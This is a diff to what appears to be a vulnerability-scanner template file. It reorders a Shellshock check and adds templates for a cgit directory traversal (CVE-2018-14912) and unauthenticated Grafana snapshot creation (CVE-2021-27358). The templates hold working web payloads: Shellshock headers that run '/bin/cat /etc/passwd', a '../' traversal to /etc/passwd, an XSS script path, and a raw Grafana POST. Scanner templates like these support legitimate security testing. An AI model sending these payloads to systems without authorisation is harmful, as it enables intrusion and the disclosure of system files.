@@ -3214,9 +3214,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5985,6 +5985,21 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/filemanager/upload.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-14912",
+      "info": {
+        "name": "cgit < 1.2.1 Directory Traversal",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -12487,6 +12502,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/calendar_form.php/\"><script>alert(document.domain)</script>"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27358",
+      "info": {
+        "name": "Grafana unauthenticated snapshot creation",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/snapshots HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json\nContent-Type: application/json\n\n{\"dashboard\": {\"editable\":false,\"hideControls\":true,\"nav\":[{\"enable\":false,\"type\":\"timepicker\"}],\"rows\": [{}],\"style\":\"dark\",\"tags\":[],\"templating\":{\"list\":[]},\"time\":{},\"timezone\":\"browser\",\"title\":\"Home\",\"version\":5},\"expires\": 3600}\n"
           ]
         }
       ]
